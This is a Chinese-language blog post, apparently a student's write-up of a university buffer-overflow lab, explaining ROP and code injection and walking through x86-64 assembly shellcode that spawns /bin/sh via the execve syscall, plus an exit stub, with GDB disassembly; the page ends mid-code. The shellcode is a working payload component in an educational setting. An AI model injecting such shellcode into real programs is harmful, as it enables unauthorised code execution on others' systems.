<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Security,Assembly,Buffer Overflow," />










<meta name="description" content="上个世纪末，Buffer Overflow是黑客最常用的攻击手段之一，主要原因是当时操作系统以及各种函数库都不够完善，并没有实现对堆栈的保护，黑客可以随意地冲破缓冲区长度限制，直接修改函数返回地址，使程序跳到黑客所希望的地方，让它做一些奇奇怪怪的事，从而达到攻击的目的。这样的攻击方法就叫Return-Oriented Programming，简称ROP。常见的实现手段有两种，其一是黑客向栈中注">
<meta name="keywords" content="Security,Assembly,Buffer Overflow">
<meta property="og:type" content="article">
<meta property="og:title" content="Buffer Overflow实践">
<meta property="og:url" content="https://ihac.xyz/2016/05/11/Buffer-Overflow实践/index.html">
<meta property="og:site_name" content="Coding">
<meta property="og:description" content="上个世纪末，Buffer Overflow是黑客最常用的攻击手段之一，主要原因是当时操作系统以及各种函数库都不够完善，并没有实现对堆栈的保护，黑客可以随意地冲破缓冲区长度限制，直接修改函数返回地址，使程序跳到黑客所希望的地方，让它做一些奇奇怪怪的事，从而达到攻击的目的。这样的攻击方法就叫Return-Oriented Programming，简称ROP。常见的实现手段有两种，其一是黑客向栈中注">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://static.zybuluo.com/hac/ievx030z55g087jjjzdek5dy/Selection_093.png">
<meta property="og:image" content="http://static.zybuluo.com/hac/o2ovzv62jrr95vlzrdxzug1x/Selection_094.png">
<meta property="og:image" content="http://static.zybuluo.com/hac/73mrfpgsumtjebroggovldju/Selection_095.png">
<meta property="og:updated_time" content="2018-03-16T02:53:18.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Buffer Overflow实践">
<meta name="twitter:description" content="上个世纪末，Buffer Overflow是黑客最常用的攻击手段之一，主要原因是当时操作系统以及各种函数库都不够完善，并没有实现对堆栈的保护，黑客可以随意地冲破缓冲区长度限制，直接修改函数返回地址，使程序跳到黑客所希望的地方，让它做一些奇奇怪怪的事，从而达到攻击的目的。这样的攻击方法就叫Return-Oriented Programming，简称ROP。常见的实现手段有两种，其一是黑客向栈中注">
<meta name="twitter:image" content="http://static.zybuluo.com/hac/ievx030z55g087jjjzdek5dy/Selection_093.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://ihac.xyz/2016/05/11/Buffer-Overflow实践/"/>





  <title>Buffer Overflow实践 | Coding</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Coding</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Thoughts, stories and ideas</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="Searching..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ihac.xyz/2016/05/11/Buffer-Overflow实践/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Xiao An">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coding">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Buffer Overflow实践</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-05-11T10:19:27+08:00">
                2016-05-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>　　上个世纪末，<code>Buffer Overflow</code>是黑客最常用的攻击手段之一，主要原因是当时操作系统以及各种函数库都不够完善，并没有实现对堆栈的保护，黑客可以随意地冲破缓冲区长度限制，直接修改函数返回地址，使程序跳到黑客所希望的地方，让它做一些奇奇怪怪的事，从而达到攻击的目的。这样的攻击方法就叫<code>Return-Oriented Programming</code>，简称<code>ROP</code>。常见的实现手段有两种，其一是黑客向栈中注入自己设计的代码，然后将函数返回地址改成注入代码的起始位置，因此当函数返回时，程序就开始执行这段注入代码了，所以黑客想干嘛就能让程序干嘛。这种攻击方式非常强大，但有一个致命缺陷，它要求栈是可执行的(<code>executable</code>)，一旦栈是不可执行的，那么函数返回后，程序就因为错误而被终止(我们可以通过在gcc编译时加选项设定栈是否可执行)。另一种方法就是专门针对不可执行栈的，黑客不再向栈中注入自己的执行代码，而是通过各种黑科技来找到程序中的<code>gadget</code>(具体方法参照<code>MIT 6-858</code>第三节课，也有现成工具可以实现)，<code>gadget</code>是一些指令片段，常见的就是<code>ret</code>和<code>pop</code>的组合，黑客的目的在于，找到很多个这样的<code>gadget</code>后，将它们链接在一起，形成<code>gadget chain</code>，也就是一段执行代码。。。总的来说，黑客在无法自己注入代码时，他可以东拼西凑找现有的代码，把它们当成零件组装成自己想要的程序代码。这种实现方式难度极大，就跟拼图一样，真的要耐住性子才能成功。<br>　　<code>MIT 6-858</code>这门课的第一个实验就是分析一个web服务器的存在的漏洞，并利用这些漏洞实现<code>Buffer Overflow</code>攻击，分别涉及到可执行栈与不可执行栈，最后再修复这些漏洞。不得不说，MIT的实验难度和本校的实验难度完全不是一个level的，我们的实验是一种<code>跟着做</code>的形式，最后也只是跑了一个<code>shell</code>出来，而MIT的实验几乎就是真实的hack。我至今还没有完成这次实验，主要是自己对汇编不是很熟悉，然后也耐不住性子连续花上几天时间来调试，有兴趣的同学可以去看一下，这是<a href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/labs/" target="_blank" rel="noopener">链接</a>。实验要求使用虚拟机跑MIT提供的系统镜像，保证运行环境一致，这里建议大家使用<code>Linux</code>+<code>kvm</code>来做实验，非常方便。<br>　　下面介绍我对<code>Buffer Overflow</code>的实践，内容是本校「信息安全综合实验」课程第二、三次实验——通过注入代码，使一个正常的程序能够运行shell。</p>
<blockquote>
<p>Start from here</p>
</blockquote>
<p>　　总的来说，实验思路还是挺明了的，我们需要自己设计一段能运行shell的汇编代码，然后汇编成机器码，并注入到某个程序的堆栈中，最后修改<code>ip</code>寄存器，使程序执行我们注入的这段代码，从而跑出一个shell来。实验难度也不大，主要是要有耐心，毕竟本次实验涉及到大量的GDB调试操作，对GDB命令不熟悉的同学可能会吃些亏，因为调试过程会使用到一些较为复杂的命令参数。当然，只使用光秃秃的原始命令也是能够完成实验的，但会浪费一些时间。另外，实验环境为64位Linux系统，所以难度可能会稍微大一些，因为网上关于<code>Buffer Overflow</code>的实践教程全部都是基于32位系统的，我们只能靠自己来慢慢摸索。</p>
<h2 id="Design-Shell-Code"><a href="#Design-Shell-Code" class="headerlink" title="Design Shell Code"></a>Design Shell Code</h2><p>　　我们第一个任务是设计一串能够执行shell的机器指令，但我们知道，不同机器有不同的指令集，不同系统对系统调用的处理也不一样，那该怎么保证我们最终注入的代码能够正常工作呢？<br>　　答案很简单，我们直接找一个能在目的主机上运行的程序，仿照设计。如下所示即为我们的样例程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sample.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> *<span class="built_in">array</span>[<span class="number">2</span>];</span><br><span class="line">   <span class="built_in">array</span>[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>;</span><br><span class="line">   <span class="built_in">array</span>[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">   execve(<span class="built_in">array</span>[<span class="number">0</span>], <span class="built_in">array</span>, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>　　这个程序通过<code>execve</code>函数产生系统调用，使进程执行shell。我们可以观察该程序编译得到的汇编代码，找到执行shell需要哪些关键步骤，然后自己重新组织，即可设计出一串能执行shell的机器指令。<br>　　这里使用gcc进行编译，注意添加两种重要选项，分别是<code>-g</code>与<code>-static</code>，分别代表<code>生成调试信息</code>、<code>采用静态链接</code>，这样可以方便我们进行调试。编译完成后，使用GDB查看二进制文件的机器指令，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># main function</span></span><br><span class="line">   │0x401164 &lt;main&gt;                 push   %rbp <span class="comment"># 保存旧的rbp，即caller的frame pointer</span></span><br><span class="line">   │0x401165 &lt;main+1&gt;               mov    %rsp,%rbp <span class="comment"># 获取新的rbp，即callee的frame pointer</span></span><br><span class="line">   │0x401168 &lt;main+4&gt;               sub    <span class="variable">$0x10</span>,%rsp <span class="comment"># 分配栈空间，两个指针需要占用16字节</span></span><br><span class="line">B+&gt;│0x40116c &lt;main+8&gt;               movq   <span class="variable">$0x495d64</span>,-0x10(%rbp) <span class="comment"># array[0]赋值</span></span><br><span class="line">   │0x401174 &lt;main+16&gt;              movq   <span class="variable">$0x0</span>,-0x8(%rbp) <span class="comment"># array[1]赋值</span></span><br><span class="line">   │0x40117c &lt;main+24&gt;              mov    -0x10(%rbp),%rax <span class="comment"># 将array[0]赋给rax</span></span><br><span class="line">   │0x401180 &lt;main+28&gt;              lea    -0x10(%rbp),%rcx <span class="comment"># 将array，即array[0]的地址赋给rcx</span></span><br><span class="line">   │0x401184 &lt;main+32&gt;              mov    <span class="variable">$0x0</span>,%edx <span class="comment"># 将NULL赋给edx</span></span><br><span class="line">   │0x401189 &lt;main+37&gt;              mov    %rcx,%rsi</span><br><span class="line">   │0x40118c &lt;main+40&gt;              mov    %rax,%rdi</span><br><span class="line">   │0x40118f &lt;main+43&gt;              callq  0x40ef30 &lt;execve&gt; <span class="comment"># 调用execve</span></span><br><span class="line">   │0x401194 &lt;main+48&gt;              mov    <span class="variable">$0x0</span>,%eax <span class="comment"># “return 0”中的0</span></span><br><span class="line">   │0x401199 &lt;main+53&gt;              leaveq <span class="comment"># 这里会将0x8(%rbp)赋给%rip，即恢复返回地址</span></span><br><span class="line">   │0x40119a &lt;main+54&gt;              retq</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve function</span></span><br><span class="line">   │0x40ef30 &lt;execve&gt;               mov    <span class="variable">$0x3b</span>,%eax <span class="comment"># 将0x3b赋给%eax</span></span><br><span class="line">   │0x40ef35 &lt;execve+5&gt;             syscall <span class="comment"># 系统调用，到此为止，之后的指令我们不用care</span></span><br><span class="line">   │0x40ef37 &lt;execve+7&gt;             cmp    <span class="variable">$0xfffffffffffff000</span>,%rax</span><br><span class="line">   │0x40ef3d &lt;execve+13&gt;            ja     0x40ef41 &lt;execve+17&gt;</span><br><span class="line">   │0x40ef3f &lt;execve+15&gt;            repz retq</span><br><span class="line">   │0x40ef41 &lt;execve+17&gt;            mov    <span class="variable">$0xffffffffffffffc0</span>,%rdx</span><br><span class="line">   │0x40ef48 &lt;execve+24&gt;            neg    %eax</span><br><span class="line">   │0x40ef4a &lt;execve+26&gt;            mov    %eax,%fs:(%rdx)</span><br><span class="line">   │0x40ef4d &lt;execve+29&gt;            or     <span class="variable">$0xffffffffffffffff</span>,%rax</span><br><span class="line">   │0x40ef51 &lt;execve+33&gt;            retq</span><br></pre></td></tr></table></figure></p>
<p>　　以上即为整个程序的汇编代码，大家按照注释对整个流程分析一遍以后，基本上就能总结出执行shell的几个必要条件了：</p>
<p>　　1. 内存中存在字符串<code>/bin/sh</code>，以<code>\x00</code>结束<br>　　2. 内存中存在一个8字节的区域存放<code>字符串的地址</code>，后面跟着一个8字节的<code>0</code><br>　　3. 将以上16字节区域的起始地址存入%rsi中<br>　　4. 将字符串地址存入%rdi中<br>　　5. 将<code>NULL</code>存入<code>%rdx</code>中<br>　　6. 将<code>0x3b</code>存入%rax中(不用纠结%eax或者%rax)<br>　　7. 系统调用，syscall指令</p>
<p>　　此时，我们只需要针对以上需求，自己设计汇编代码即可。然而，现实总是很残酷，第1点需求估计就能难倒不少人，把字符串加载到内存不难，直接用<code>.string</code>即可，但是我们怎么获取该字符串的地址呢？莫非只能通过手工计算？那样该多麻烦呀！在这里我想了很久，最终想出的办法是直接往栈里写入<code>/bin/sh</code>，地址可以通过对<code>%rsp</code>加加减减获得，但这样的方法非常不优雅，一旦我们不再执行<code>/bin/sh</code>，想换为<code>/usr/local/bin/zsh</code>，那么我们的代码需要进行大幅度的修改。后来在<a href="http://phrack.org/issues/49/14.html" target="_blank" rel="noopener">Phrack</a>上看到一个很tricky的办法，它很好的利用了<code>call</code>指令的特性，实现字符串地址的自动获取：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 非常妙的一种思路</span></span><br><span class="line">    jmp bbb</span><br><span class="line">aaa:</span><br><span class="line">    <span class="keyword">do</span> sth <span class="comment"># 执行到这里时，%rsp所指向的8字节堆栈空间存放的就是"/bin/sh"的起始地址</span></span><br><span class="line">    ...</span><br><span class="line">bbb:</span><br><span class="line">    call aaa <span class="comment"># 执行这条指令时，会自动将下一条指令的地址压入堆栈</span></span><br><span class="line">    .string <span class="string">"/bin/sh"</span></span><br></pre></td></tr></table></figure>
<p>　　这样一来，我们就解决了获取字符串地址的问题，接下来的几个需求都很容易实现，这里就不做具体介绍，直接贴出我设计的一段代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell_1.s</span></span><br><span class="line">main:</span><br><span class="line">    jmp bbb</span><br><span class="line">aaa:</span><br><span class="line">    movq <span class="variable">$0x0</span>, %rax</span><br><span class="line">    movq %rax, 0x8(%rsp) <span class="comment"># array[1]赋值为NULL，对应第2点需求</span></span><br><span class="line">    movq 0x0(%rsp), %rdi <span class="comment"># array[0]，即字符串地址，对应第4点需求</span></span><br><span class="line">    lea 0x0(%rsp), %rsi <span class="comment"># array，对应第3点需求</span></span><br><span class="line">    movq <span class="variable">$0x0</span>, %rdx <span class="comment"># NULL，对应第5点需求</span></span><br><span class="line">    movl <span class="variable">$0x3b</span>, %eax <span class="comment"># 对应第6点需求</span></span><br><span class="line">    syscall <span class="comment"># 对应第7点需求</span></span><br><span class="line">bbb:</span><br><span class="line">    callq aaa</span><br><span class="line">    .string <span class="string">"/bin/sh"</span> <span class="comment"># 对应第1点需求</span></span><br><span class="line"></span><br><span class="line">    .global main</span><br><span class="line">    .<span class="built_in">type</span> main, @<span class="keyword">function</span></span><br></pre></td></tr></table></figure>
<p>　　使用gcc编译这段汇编代码，获得可执行文件，并运行：<br><img src="http://static.zybuluo.com/hac/ievx030z55g087jjjzdek5dy/Selection_093.png" alt="Selection_093.png-128.1kB"></p>
<p>　　It works!!! 可以看到，程序执行之前我们使用的shell是<code>bash</code>，而在程序执行以后，我们使用的shell是<code>/bin/sh</code>，这说明我们的代码能够正常产生<code>execve</code>系统调用。<br>　　好，这样是不是就已经完成我们的第一部分工作——<strong>Design Shell Code</strong>了呢？当然并没有这么简单！我们来分析一下这个程序可能存在的问题。首先，如果<code>execve</code>系统调用失败了会如何？很简单，在执行完<code>syscall</code>指令以后，由于系统调用失败，程序并不会发生跳转，而是继续执行下一条指令，也就是<code>callq aaa</code>指令，显然这将导致死循环，最终导致程序崩溃。有兴趣的同学可以自己做一个小实验，把系统调用的三个参数修改一下，然后重新编译运行，我们会发现程序卡住一段时间，然后自动崩溃，并报错<code>Segmentation fault (core dumped)</code>。为了解决这一隐患，我们可以在原有的<code>syscall</code>指令后面再添加几条指令，调用<code>exit</code>，强行终止程序。这几条指令的设计和之前执行shell指令的设计原理类似，我们编写一个简单的C程序，其中调用<code>exit(0)</code>，然后将其编译得到可执行文件，观察<code>exit</code>这个系统调用需要哪些条件，我们再有针对性的为其设计指令即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sample2.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序汇编指令如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># main function</span></span><br><span class="line">   │0x401164 &lt;main&gt;                 push   %rbp</span><br><span class="line">   │0x401165 &lt;main+1&gt;               mov    %rsp,%rbp</span><br><span class="line">B+&gt;│0x401168 &lt;main+4&gt;               mov    <span class="variable">$0x0</span>,%edi</span><br><span class="line">   │0x40116d &lt;main+9&gt;               callq  0x401c00 &lt;<span class="built_in">exit</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit function</span></span><br><span class="line">   │0x401c00 &lt;<span class="built_in">exit</span>&gt;                 sub    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">   │0x401c04 &lt;<span class="built_in">exit</span>+4&gt;               mov    <span class="variable">$0x1</span>,%edx</span><br><span class="line">   │0x401c09 &lt;<span class="built_in">exit</span>+9&gt;               mov    <span class="variable">$0x6c1080</span>,%esi</span><br><span class="line">   │0x401c0e &lt;<span class="built_in">exit</span>+14&gt;              callq  0x401b00 &lt;__run_exit_handlers&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># __run_exit_handlers function</span></span><br><span class="line">   <span class="comment"># ... 省略</span></span><br><span class="line">   │0x401bdd &lt;__run_exit_handlers+221&gt;      add    <span class="variable">$0x8</span>,%rbp</span><br><span class="line">   │0x401be1 &lt;__run_exit_handlers+225&gt;      cmp    <span class="variable">$0x4b3050</span>,%rbp</span><br><span class="line">   │0x401be8 &lt;__run_exit_handlers+232&gt;      jb     0x401bda &lt;__run_exit_handlers+218&gt;</span><br><span class="line">   │0x401bea &lt;__run_exit_handlers+234&gt;      mov    %ebx,%edi</span><br><span class="line">  &gt;│0x401bec &lt;__run_exit_handlers+236&gt;      callq  0x40eec0 &lt;_exit&gt;</span><br><span class="line">   <span class="comment"># ... 省略</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># _exit function</span></span><br><span class="line">   │0x40eec0 &lt;_exit&gt;                movslq %edi,%rdx</span><br><span class="line">   │0x40eec3 &lt;_exit+3&gt;              mov    <span class="variable">$0xffffffffffffffc0</span>,%r9</span><br><span class="line">   │0x40eeca &lt;_exit+10&gt;             mov    <span class="variable">$0xe7</span>,%r8d</span><br><span class="line">   │0x40eed0 &lt;_exit+16&gt;             mov    <span class="variable">$0x3c</span>,%esi</span><br><span class="line">   │0x40eed5 &lt;_exit+21&gt;             jmp    0x40eef0 &lt;_exit+48&gt;</span><br><span class="line">   │0x40eed7 &lt;_exit+23&gt;             nopw   0x0(%rax,%rax,1)</span><br><span class="line">   │0x40eee0 &lt;_exit+32&gt;             mov    %rdx,%rdi</span><br><span class="line">   │0x40eee3 &lt;_exit+35&gt;             mov    %esi,%eax</span><br><span class="line">   │0x40eee5 &lt;_exit+37&gt;             syscall</span><br><span class="line">   │0x40eee7 &lt;_exit+39&gt;             cmp    <span class="variable">$0xfffffffffffff000</span>,%rax</span><br><span class="line">   │0x40eeed &lt;_exit+45&gt;             ja     0x40ef08 &lt;_exit+72&gt;</span><br><span class="line">   │0x40eeef &lt;_exit+47&gt;             hlt</span><br><span class="line">   │0x40eef0 &lt;_exit+48&gt;             mov    %rdx,%rdi</span><br><span class="line">   │0x40eef3 &lt;_exit+51&gt;             mov    %r8d,%eax</span><br><span class="line">  &gt;│0x40eef6 &lt;_exit+54&gt;             syscall</span><br><span class="line">   │0x40eef8 &lt;_exit+56&gt;             cmp    <span class="variable">$0xfffffffffffff000</span>,%rax</span><br><span class="line">   │0x40eefe &lt;_exit+62&gt;             jbe    0x40eee0 &lt;_exit+32&gt;</span><br><span class="line">   │0x40ef00 &lt;_exit+64&gt;             neg    %eax</span><br><span class="line">   │0x40ef02 &lt;_exit+66&gt;             mov    %eax,%fs:(%r9)</span><br><span class="line">   │0x40ef06 &lt;_exit+70&gt;             jmp    0x40eee0 &lt;_exit+32&gt;</span><br><span class="line">   │0x40ef08 &lt;_exit+72&gt;             neg    %eax</span><br><span class="line">   │0x40ef0a &lt;_exit+74&gt;             mov    %eax,%fs:(%r9)</span><br><span class="line">   │0x40ef0e &lt;_exit+78&gt;             jmp    0x40eeef &lt;_exit+47&gt;</span><br></pre></td></tr></table></figure></p>
<p>　　不得不说，分析<code>exit</code>的汇编指令比分析<code>execve</code>要难得多，因为这里面涉及到了3层调用，尤其是<code>__run_exit_handlers</code>，看着就头痛。更悲剧的是，由于<code>syscall</code>前面有近百条汇编指令，系统调用的参数可能在之前某一条指令中就已经存入寄存器了，如果要分析出该系统调用具体有哪些必需参数，貌似我们只能把每一条指令都弄明白。不过程序员可不是苦力，怎么能干这种吃力不讨好的事呢？肯定有投机取巧的方法！<br>　　不同于32位机的堆栈传递参数，对于64位机，我们知道，函数调用的参数是通过寄存器传递的，而常用的寄存器就那么几个，分别是<code>%rdi</code>、<code>%rsi</code>、<code>%rdx</code>、<code>%rax</code>，因此，我们完全可以在执行<code>syscall</code>指令前把这几个寄存器的值全部抓下来，不管是不是真正的参数，总之我在使用的时候就按这个进行赋值，这样总能执行成功吧！话不多说，立马实践，使用GDB跟踪程序到<code>syscall</code>指令，然后查看四个参数寄存器的值：<br>　　<img src="http://static.zybuluo.com/hac/o2ovzv62jrr95vlzrdxzug1x/Selection_094.png" alt="Selection_094.png-128.3kB"><br>　　这样，我们也就获得了调用<code>exit</code>的几个必要条件：</p>
<p>　　1. 将<code>0xe7</code>存入<code>%rax</code>(实际上是<code>%eax</code>)中<br>　　2. 将<code>0x0</code>存入<code>%rdx</code>中<br>　　3. 将<code>0x0</code>存入<code>%rdi</code>中<br>　　4. 将<code>0x3c</code>分别存入<code>%rsi</code>中<br>　　5. 系统调用，syscall指令</p>
<p>　　根据以上需求，我们可以设计出能够产生<code>exit</code>系统调用的代码段：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exit.s</span></span><br><span class="line">main:</span><br><span class="line">    movl <span class="variable">$0xe7</span>, %eax <span class="comment"># 对应第1点需求</span></span><br><span class="line">    movq <span class="variable">$0x0</span>, %rdx <span class="comment"># 对应第2点需求</span></span><br><span class="line">    movq <span class="variable">$0x0</span>, %rdi <span class="comment"># 对应第3点需求</span></span><br><span class="line">    movq <span class="variable">$0x3c</span>, %rsi <span class="comment"># 对应第4点需求</span></span><br><span class="line">    syscall <span class="comment"># 对应第5点需求</span></span><br><span class="line"></span><br><span class="line">    .global main</span><br><span class="line">    .<span class="built_in">type</span> main, @<span 